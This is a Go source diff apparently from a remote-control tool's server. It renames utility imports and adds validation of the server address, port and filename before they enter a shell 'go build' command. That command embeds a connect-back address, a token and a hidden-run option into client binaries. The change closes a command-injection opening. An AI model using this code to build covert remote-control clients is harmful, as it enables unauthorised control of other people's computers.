@@ -4,11 +4,11 @@ import (
 	"context"
 	"fmt"
 	"github.com/google/uuid"
-	"github.com/tiagorlampert/CHAOS/internal/utilities"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/constants"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/image"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/jwt"
-	"github.com/tiagorlampert/CHAOS/internal/utilities/system"
+	"github.com/tiagorlampert/CHAOS/internal/utils"
+	"github.com/tiagorlampert/CHAOS/internal/utils/constants"
+	"github.com/tiagorlampert/CHAOS/internal/utils/image"
+	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
+	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	repo "github.com/tiagorlampert/CHAOS/repositories"
 	"os/exec"
 	"strings"
@@ -38,7 +38,7 @@ func NewClient(
 }
 
 func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
-	addr, err := utilities.DecodeBase64(input.MacAddress)
+	addr, err := utils.DecodeBase64(input.MacAddress)
 	if err != nil {
 		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
 	}
@@ -60,7 +60,7 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 		}
 	}
 
-	res := utilities.ByteToString(payload.Response)
+	res := utils.ByteToString(payload.Response)
 	if payload.HasError {
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
@@ -77,7 +77,7 @@ func HandleResponse(payload *PayloadData) (*PayloadData, error) {
 		if err != nil {
 			return nil, err
 		}
-		payload.Response = utilities.StringToByte(file)
+		payload.Response = utils.StringToByte(file)
 		break
 	default:
 		return payload, nil
@@ -86,13 +86,27 @@ func HandleResponse(payload *PayloadData) (*PayloadData, error) {
 }
 
 func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
+	if !utils.IsValidIPAddress(input.ServerAddress) &&
+		!utils.IsValidURL(input.ServerAddress) {
+		return "", ErrInvalidServerAddress
+	}
+
+	if !utils.StringIsNumber(input.ServerPort) {
+		return "", ErrInvalidServerPort
+	}
+
+	filename, err := utils.NormalizeString(input.Filename)
+	if err != nil {
+		return "", err
+	}
+
 	token, err := c.GenerateNewToken()
 	if err != nil {
 		return "", err
 	}
 
 	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
-	filename := handleFilename(input.OSTarget, input.Filename)
+	filename = handleFilename(input.OSTarget, filename)
 	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.appVersion, input.ServerPort, input.ServerAddress, token, filename)
 	cmd := exec.Command("sh", "-c", buildCmd)
 	cmd.Dir = "client/"
